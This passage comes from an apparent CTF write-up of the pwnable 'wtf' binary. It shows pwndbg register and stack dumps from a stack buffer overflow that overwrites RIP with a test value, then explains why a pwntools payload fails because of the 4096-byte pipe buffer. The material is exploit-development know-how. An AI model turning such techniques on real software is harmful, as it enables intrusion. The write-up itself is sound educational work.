+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span>:<span style="color:#ae81ff">0008</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7fffffffe828</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#e6db74">&#39;saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span>:<span style="color:#ae81ff">0010</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7fffffffe830</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#e6db74">&#39;uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span>:<span style="color:#ae81ff">0018</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7fffffffe838</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#e6db74">&#39;waaaxaaayaaazaabbaabcaabdaabeaabfaabgaab&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>:<span style="color:#ae81ff">0020</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7fffffffe840</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#e6db74">&#39;yaaazaabbaabcaabdaabeaabfaabgaab&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">05</span>:<span style="color:#ae81ff">0028</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7fffffffe848</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#e6db74">&#39;baabcaabdaabeaabfaabgaab&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span>:<span style="color:#ae81ff">0030</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7fffffffe850</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#e6db74">&#39;daabeaabfaabgaab&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">07</span>:<span style="color:#ae81ff">0038</span><span style="color:#960050;background-color:#1e0010">│</span>     <span style="color:#ae81ff">0x7fffffffe858</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#e6db74">&#39;faabgaab&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>[ BACKTRACE ]<span style="color:#960050;background-color:#1e0010">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0x616161706161616f</span> None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0x6161617261616171</span> None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0x6161617461616173</span> None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">0x6161617661616175</span> None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">0x6161617861616177</span> None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">0x6261617a61616179</span> None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span> <span style="color:#ae81ff">0x6261616362616162</span> None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span> <span style="color:#ae81ff">0x6261616562616164</span> None
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span></code></pre></div><p>Lets see if i can control where RIP points to</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> run 
+</span></span><span style="display:flex;"><span>Starting program: <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>malicious<span style="color:#f92672">/</span>hethet<span style="color:#f92672">/</span>pwnable<span style="color:#f92672">/</span>wtf<span style="color:#f92672">/</span>wtf 
+</span></span><span style="display:flex;"><span>warning: Unable to find libthread_db matching inferior<span style="color:#e6db74">&#39;s thread library, thread debugging will not be available.</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaLLLLLLLL
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Program received <span style="color:#66d9ef">signal</span> SIGSEGV, Segmentation fault<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x4c4c4c4c4c4c4c4c</span> <span style="color:#f92672">in</span> <span style="color:#960050;background-color:#1e0010">??</span> ()
+</span></span><span style="display:flex;"><span>LEGEND: STACK <span style="color:#f92672">|</span> HEAP <span style="color:#f92672">|</span> CODE <span style="color:#f92672">|</span> DATA <span style="color:#f92672">|</span> WX <span style="color:#f92672">|</span> RODATA
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>[ REGISTERS <span style="color:#f92672">/</span> show<span style="color:#f92672">-</span>flags off <span style="color:#f92672">/</span> show<span style="color:#f92672">-</span>compact<span style="color:#f92672">-</span>regs off ]<span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span style="display:flex;"><span> RAX  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RBX  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RCX  <span style="color:#ae81ff">0x40</span>
+</span></span><span style="display:flex;"><span> RDX  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RDI  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RSI  <span style="color:#ae81ff">0x7fffffffe7bb</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0xffe810000000400a</span> <span style="color:#f92672">/*</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">@&#39;</span> <span style="color:#f92672">*/</span>
+</span></span><span style="display:flex;"><span> R8   <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R9   <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R10  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R11  <span style="color:#ae81ff">0x202</span>
+</span></span><span style="display:flex;"><span> R12  <span style="color:#ae81ff">0x7fffffffe938</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7fffffffebc0</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#e6db74">&#39;/home/malicious/hethet/pwnable/wtf/wtf&#39;</span>
+</span></span><span style="display:flex;"><span> R13  <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span> R14  <span style="color:#ae81ff">0x7ffff7ffd000</span> (_rtld_global) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffff7ffe2f0</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R15  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RBP  <span style="color:#ae81ff">0x6161616e6161616d</span> (<span style="color:#e6db74">&#39;maaanaaa&#39;</span>)
+</span></span><span style="display:flex;"><span> RSP  <span style="color:#ae81ff">0x7fffffffe820</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RIP  <span style="color:#ae81ff">0x4c4c4c4c4c4c4c4c</span> (<span style="color:#e6db74">&#39;LLLLLLLL&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>[ DISASM <span style="color:#f92672">/</span> x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span> <span style="color:#f92672">/</span> set emulate on ]<span style="color:#960050;background-color:#1e0010">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span style="display:flex;"><span>Invalid address <span style="color:#ae81ff">0x4c4c4c4c4c4c4c4c</span>
+</span></span></code></pre></div><p>Yes! Yes We Can!
+We can now redirect to win.</p>
+<h3 id="no-we-cant-getting-stuck">No we cant! (getting stuck)</h3>
+<p>For some reason, when trying to exploit this bug with pwntools,
+pwndbg shows that we are no longer overwriting RIP.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Reading symbols from .<span style="color:#f92672">/</span>wtf...
+</span></span><span style="display:flex;"><span>(No debugging symbols found in .<span style="color:#f92672">/</span>wtf)
+</span></span><span style="display:flex;"><span>Attaching to program: <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>malicious<span style="color:#f92672">/</span>hethet<span style="color:#f92672">/</span>pwnable<span style="color:#f92672">/</span>wtf<span style="color:#f92672">/</span>wtf, process <span style="color:#ae81ff">12448</span>
+</span></span><span style="display:flex;"><span>Reading symbols from <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libc.so<span style="color:#ae81ff">.6</span>...
+</span></span><span style="display:flex;"><span>(No debugging symbols found in <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libc.so<span style="color:#ae81ff">.6</span>)
+</span></span><span style="display:flex;"><span>Reading symbols from <span style="color:#f92672">/</span>lib64<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64.</span>so<span style="color:#ae81ff">.2</span>...
+</span></span><span style="display:flex;"><span>(No debugging symbols found in <span style="color:#f92672">/</span>lib64<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64.</span>so<span style="color:#ae81ff">.2</span>)
+</span></span><span style="display:flex;"><span>[Thread debugging using libthread_db enabled]
+</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/usr/lib/libthread_db.so.1&#34;</span>.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00007f13a869318e</span> in <span style="color:#f92672">??</span> () from <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libc.so<span style="color:#ae81ff">.6</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-------</span> tip of the <span style="color:#a6e22e">day</span> (disable with set show<span style="color:#f92672">-</span>tips off) <span style="color:#f92672">-------</span>
+</span></span><span style="display:flex;"><span>The set show<span style="color:#f92672">-</span>flags on setting will display CPU flags <span style="color:#66d9ef">register</span> in the regs context panel
+</span></span><span style="display:flex;"><span>LEGEND: STACK <span style="color:#f92672">|</span> HEAP <span style="color:#f92672">|</span> CODE <span style="color:#f92672">|</span> DATA <span style="color:#f92672">|</span> WX <span style="color:#f92672">|</span> RODATA
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">───────────────────────────────────────────────────────────────────</span>[ REGISTERS <span style="color:#f92672">/</span> show<span style="color:#f92672">-</span>flags off <span style="color:#f92672">/</span> show<span style="color:#f92672">-</span>compact<span style="color:#f92672">-</span>regs off ]<span style="color:#960050;background-color:#1e0010">───────────────────────────────────────────────────────────────────</span>
+</span></span><span style="display:flex;"><span> RAX  <span style="color:#ae81ff">0xfffffffffffffe00</span>
+</span></span><span style="display:flex;"><span> RBX  <span style="color:#ae81ff">0x7f13a88088e0</span> (_IO_2_1_stdin_) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0xfbad2088</span>
+</span></span><span style="display:flex;"><span> RCX  <span style="color:#ae81ff">0x7f13a869318e</span> <span style="color:#960050;background-color:#1e0010">◂—</span> leave 
+</span></span><span style="display:flex;"><span> RDX  <span style="color:#ae81ff">0x1000</span>
+</span></span><span style="display:flex;"><span> RDI  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RSI  <span style="color:#ae81ff">0x39e8b010</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R8   <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R9   <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R10  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R11  <span style="color:#ae81ff">0x202</span>
+</span></span><span style="display:flex;"><span> R12  <span style="color:#ae81ff">0x7f13a8807030</span> (_IO_file_jumps) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R13  <span style="color:#ae81ff">0x7f13a8806ee0</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R14  <span style="color:#ae81ff">0x64</span>
+</span></span><span style="display:flex;"><span> R15  <span style="color:#ae81ff">0x7f13a88088e0</span> (_IO_2_1_stdin_) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0xfbad2088</span>
+</span></span><span style="display:flex;"><span> RBP  <span style="color:#ae81ff">0x7ffee1dc0340</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffee1dc0360</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffee1dc0380</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffee1dc03c0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffee1dc03f0</span> <span style="color:#960050;background-color:#1e0010">◂—</span> ...
+</span></span><span style="display:flex;"><span> RSP  <span style="color:#ae81ff">0x7ffee1dc0330</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RIP  <span style="color:#ae81ff">0x7f13a869318e</span> <span style="color:#960050;background-color:#1e0010">◂—</span> leave 
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">────────────────────────────────────────────────────────────────────────────</span>[ DISASM <span style="color:#f92672">/</span> x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span> <span style="color:#f92672">/</span> set emulate on ]<span style="color:#960050;background-color:#1e0010">────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0x7f13a869318e</span>    leave  
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7f13a869318f</span>    ret                                <span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x7f13a86931b4</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7f13a86931b4</span>    pop    rdx              RDX <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7f13a86931b5</span>    pop    rcx              RCX <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0x7f13a86901e6</span> (_IO_doallocbuf<span style="color:#f92672">+</span><span style="color:#ae81ff">86</span>)
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7f13a86931b6</span>    cmp    rax, <span style="color:#f92672">-</span><span style="color:#ae81ff">0x1000</span>     <span style="color:#ae81ff">0xfffffffffffffe00</span> <span style="color:#f92672">-</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x1000</span>     EFLAGS <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0x206</span> [ cf PF af zf sf IF df of ac ]
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7f13a86931bc</span>  <span style="color:#960050;background-color:#1e0010">✔</span> ja     <span style="color:#ae81ff">0x7f13a86931c0</span>              <span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x7f13a86931c0</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7f13a86931c0</span>    mov    rdx, qword ptr [rip <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x174b29</span>]     RDX, [<span style="color:#ae81ff">0x7f13a8807cf0</span>] <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0xffffffffffffffa0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7f13a86931c7</span>    neg    eax
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7f13a86931c9</span>    mov    dword ptr fs:[rdx], eax             [<span style="color:#ae81ff">0x7f13a898b6e0</span>] <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x200</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7f13a86931cc</span>    mov    rax, <span style="color:#ae81ff">0xffffffffffffffff</span>             RAX <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0xffffffffffffffff</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7f13a86931d3</span>    leave  
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">─────────────────────────────────────────────────────────────────────────────────────────</span>[ STACK ]<span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0000</span><span style="color:#960050;background-color:#1e0010">│</span> rsp <span style="color:#ae81ff">0x7ffee1dc0330</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">0x7ffee1dc0338</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0xc206020b169c5700</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0010</span><span style="color:#960050;background-color:#1e0010">│</span> rbp <span style="color:#ae81ff">0x7ffee1dc0340</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffee1dc0360</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffee1dc0380</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffee1dc03c0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffee1dc03f0</span> <span style="color:#960050;background-color:#1e0010">◂—</span> ...
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span><span style="color:#f92672">:</span><span style="color:#ae81ff">001</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">0x7ffee1dc0348</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7f13a86931b4</span> <span style="color:#960050;background-color:#1e0010">◂—</span> pop rdx <span style="color:#75715e">/* &#39;ZYH=&#39; */</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0020</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">010</span> <span style="color:#ae81ff">0x7ffee1dc0350</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">05</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">01</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">0x7ffee1dc0358</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7f13a86901e6</span> (_IO_doallocbuf<span style="color:#f92672">+</span><span style="color:#ae81ff">86</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> cmp eax, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0030</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">020</span> <span style="color:#ae81ff">0x7ffee1dc0360</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffee1dc0380</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffee1dc03c0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffee1dc03f0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffee1dc0b30</span> <span style="color:#960050;background-color:#1e0010">◂—</span> ...
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">07</span><span style="color:#f92672">:</span><span style="color:#ae81ff">003</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span><span style="color:#f92672">+</span><span style="color:#ae81ff">02</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">0x7ffee1dc0368</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7f13a870da2e</span> (read<span style="color:#f92672">+</span><span style="color:#ae81ff">30</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> leave 
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">───────────────────────────────────────────────────────────────────────────────────────</span>[ BACKTRACE ]<span style="color:#960050;background-color:#1e0010">────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0x7f13a869318e</span> None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">0x7f13a86931b4</span> None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>   <span style="color:#ae81ff">0x7f13a870da2e</span> read<span style="color:#f92672">+</span><span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>   <span style="color:#ae81ff">0x7f13a868dc1c</span> _IO_file_underflow<span style="color:#f92672">+</span><span style="color:#ae81ff">364</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>   <span style="color:#ae81ff">0x7f13a86902d3</span> _IO_default_uflow<span style="color:#f92672">+</span><span style="color:#ae81ff">51</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span>   <span style="color:#ae81ff">0x7f13a8667678</span> None
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span>   <span style="color:#ae81ff">0x7f13a865a896</span> __isoc99_scanf<span style="color:#f92672">+</span><span style="color:#ae81ff">182</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span>         <span style="color:#ae81ff">0x400691</span> main<span style="color:#f92672">+</span><span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>Weird&hellip;.</p>
+<h3 id="what-is-a-piped-buffer">What is a piped buffer</h3>
+<p>After banging my head against the wall repeatedly, I kept thinking to myself, why is my payload behaving differently when i feed it via stdin,
+as compared to using pwntools?</p>
+<p>And then it dawned on me,</p>
+<p>pwntools is probably piping it to the binary, right?</p>
+<p>Is there a difference in the way linux treats input from just normal stdin vs pipes?</p>
+<p>The answer is unfortunately yes.</p>
+<p>Here&rsquo;s a screenshot from Wikipedia:</p>
+<figure><img src="/images/wtf/wikipedia_screenshot.png" width="100%">
+</figure>
+
+<h3 id="why-the-exploit-conditions-change">Why the exploit conditions change</h3>
+<p>the <code>read</code> function is probably reading directly from the pipe buffer.
+Since the piped buffer on a modern linux system is 4096 bytes, that means we needs more than 4096 bytes to overflow now.</p>
+<p>Lets prove this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>Program received <span style="color:#66d9ef">signal</span> SIGSEGV, Segmentation fault<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040064c</span> <span style="color:#f92672">in</span> my_fgets ()
+</span></span><span style="display:flex;"><span>LEGEND: STACK <span style="color:#f92672">|</span> HEAP <span style="color:#f92672">|</span> CODE <span style="color:#f92672">|</span> DATA <span style="color:#f92672">|</span> WX <span style="color:#f92672">|</span> RODATA
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>[ REGISTERS <span style="color:#f92672">/</span> show<span style="color:#f92672">-</span>flags off <span style="color:#f92672">/</span> show<span style="color:#f92672">-</span>compact<span style="color:#f92672">-</span>regs off ]<span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+</span></span><span style="display:flex;"><span> RAX  <span style="color:#ae81ff">0x7ffffffff000</span>
+</span></span><span style="display:flex;"><span> RBX  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RCX  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RDX  <span style="color:#ae81ff">0x61</span>
+</span></span><span style="display:flex;"><span> RDI  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RSI  <span style="color:#ae81ff">0x7fffffffe82b</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0xffe880000007b061</span>
+</span></span><span style="display:flex;"><span> R8   <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R9   <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R10  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R11  <span style="color:#ae81ff">0x202</span>
+</span></span><span style="display:flex;"><span> R12  <span style="color:#ae81ff">0x7fffffffe9a8</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x62616c7362616b73</span> (<span style="color:#e6db74">&#39;skabslab&#39;</span>)
+</span></span><span style="display:flex;"><span> R13  <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span> R14  <span style="color:#ae81ff">0x7ffff7ffd000</span> (_rtld_global) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7ffff7ffe2f0</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> R15  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> RBP  <span style="color:#ae81ff">0x7fffffffe830</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7fffffffe880</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x62616d7062616c70</span> (<span style="color:#e6db74">&#39;plabpmab&#39;</span>)
+</span></span><span style="display:flex;"><span> RSP  <span style="color:#ae81ff">0x7fffffffe810</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0xfffff84e00000000</span>
+</span></span><span style="display:flex;"><span> RIP  <span style="color:#ae81ff">0x40064c</span> (my_fgets<span style="color:#f92672">+</span><span style="color:#ae81ff">72</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> mov byte ptr [rax], dl
